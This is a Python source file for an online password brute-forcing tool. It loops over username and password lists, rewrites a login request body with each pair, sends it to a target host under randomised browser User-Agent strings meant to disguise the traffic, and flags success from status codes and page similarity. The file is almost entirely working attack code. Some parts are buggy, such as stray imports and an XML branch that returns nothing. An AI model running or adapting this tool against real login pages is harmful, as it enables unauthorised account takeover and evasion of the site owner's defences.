import sys
import time
from scipy import rand


import time
import requests
from lxml import html
from scipy import rand
import mechanize
import ssl
success = False

def brute(parameters, passwords):
    '''
    sends all combinations for usernames and passwords to the attack function on the login page
    '''

    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'action' : parameters['action'],
               'headers': parameters['req_header'],
               'host': parameters['host'],
               'req_body' : parameters['req_body'],
               }

    # return
    req_body_type, content['req_body'] = get_req_type(content['headers'], content['req_body'])
    print("up: " + str(content['req_body']))
    
    # if userlist is provided then checks if passwordlist is provided or just 1 password
    for user in parameters['user_list']:
        user = user.strip()
        user = user.split('\t')
        content['username'] = user[0]
        for password in passwords:
            password = password.strip()
            password = password.split('\t')
            content['password'] = password[0]
            content['req_body'] = change_cred(content['req_body'], content['user_param'], content['password_param'], content['username'], content['password'], req_body_type)
            attack(content)


    


def change_cred(req_body, user_param, pass_param, username, password, req_body_type):
    print('[+]type: ' + str(type(req_body)) + "real type: " + str(req_body_type))
    req_body[user_param] = username
    req_body[pass_param] = password
    
    if req_body_type == 'JSON':
        return req_body
    
    elif req_body_type == 'XML':
        pass
        
    elif req_body_type == 'URL_ENCODED':
        import urllib
        return urllib.parse.urlencode(req_body)  # convert from json to encoded

def attack(content):
    '''
   create a packet containing fake headers and the payload(username,password) and submit it to the server
    '''
    print("url: " + str(content['host']))
    url = content['host']

    # build packet headers in order to disguise as a browser
    headers = content['headers']
    headers['User-Agent'] = get_random_user_agent()
    payload = content['req_body']
    print("[+ req_body]: " + str(content['req_body']))

    res = requests.get(url)
    if content['method'] == 'post':
        resp = requests.post(content['host'], data=payload)
    else:
        resp = requests.get(url,data=payload,headers=headers)
    print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
    print(resp.status_code)
    if check_login(resp, res):
        print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
        global success
        success = True
        sys.exit(1)

def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def get_req_type(header, req_body):
    type = 'json' # header['Content-Type']
    print("header: " + str(type))
    if 'json' in type:
        return 'JSON', req_body

    elif 'xml' in type:
        import xmltodict
        return 'XML', xmltodict.parse(req_body)

    else:
        import urllib
        return 'URL_ENCODED', urllib.parse.parse_qs(req_body)
        

def check_login(content_1, content_2):
    '''
    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
    '''
    from html_similarity import style_similarity, structural_similarity, similarity
    k=0.3
    similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text, content_2.text)
    
    if  content_1.status_code > 400:
        return False
    
    elif similarity < 0.7 and len(content_1.text) > len(content_2.text):
        return True
    
    elif  content_1.status_code == 201 or content_1.status_code == 302:
        return True

    else:
        return False

